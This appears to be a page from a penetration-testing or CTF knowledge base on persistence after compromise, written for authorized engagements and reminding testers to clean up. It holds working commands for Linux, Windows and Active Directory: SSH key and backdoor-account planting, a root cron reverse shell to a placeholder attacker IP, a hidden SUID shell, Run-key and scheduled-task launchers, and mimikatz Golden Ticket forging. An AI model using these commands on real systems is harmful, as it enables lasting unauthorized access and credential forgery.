# Persistence

Persistence mechanisms maintain access to a compromised system after a reboot, session timeout, or credential rotation. On real engagements, only establish persistence when explicitly in scope — and always document and remove every mechanism before the assessment closes.

!!! warning "Watch out"
    Leaving backdoors in client environments without explicit sign-off is a significant liability. Document every persistence mechanism with the host, technique, location, and timestamp. Clean up during the debrief phase.

---

## Methodology

### 1. Determine If Persistence Is Needed

On HTB and most CTFs, persistence isn't necessary — you have full control of the environment. On real engagements, assess whether persistence is in scope and what level is appropriate:

- **Session persistence** — survive a disconnect but not a reboot (SSH key, WinRM backdoor)
- **Reboot persistence** — survive a restart (cron, scheduled task, registry run key, service)
- **Domain persistence** — survive credential rotation (Golden Ticket, shadow admin account)

---

### 2. Linux Persistence

Prefer techniques that blend with normal system activity:

```bash
# SSH key backdoor (survives reboots, looks legitimate)
echo '<your-public-key>' >> /root/.ssh/authorized_keys

# Cron job (execute every minute as root)
echo '* * * * * root bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1' >> /etc/crontab

# SUID shell (instant root on return)
cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash
# Connect back: /tmp/.bash -p
```

See [Linux Persistence](linux.md) for additional techniques including init scripts and library preloading.

---

### 3. Windows Persistence

```powershell
# Registry Run key (executes on user login)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Temp\shell.exe"

# Scheduled task (executes on reboot)
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\shell.exe" /sc onstart /ru SYSTEM

# Add local admin account
net user backdoor P@ssw0rd123 /add
net localgroup Administrators backdoor /add
```

See [Windows Persistence](windows.md), [Registry & Scheduled Tasks](registry-scheduled-tasks.md), and [DLL Injection & Services](dll-injection-malicious-services.md).

---

### 4. Active Directory Persistence

Domain-level persistence survives local remediation — the account or ticket remains valid even after the initially compromised host is wiped.

```powershell
# Golden Ticket — valid for 10 years by default
mimikatz # lsadump::lsa /patch         # dump krbtgt hash
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:<sid> /krbtgt:<hash> /ptt
```

See [Active Directory Persistence](privilege-escalation/active-directory/persistence.md) for Golden Ticket and Shadow Copy techniques.

---

### 5. Backdoor Remote Access

A dedicated backdoor channel is useful when primary access (SSH, WinRM) gets blocked or credentials are rotated.

```bash
# SSH authorized_keys (Linux)
mkdir -p /root/.ssh && echo '<public-key>' >> /root/.ssh/authorized_keys

# WinRM backdoor user (Windows)
net user backdoor P@ssw0rd123 /add
net localgroup "Remote Management Users" backdoor /add
```

See [Backdoor SSH & WinRM](backdoor-ssh-winrm.md) for setup and cleanup steps.
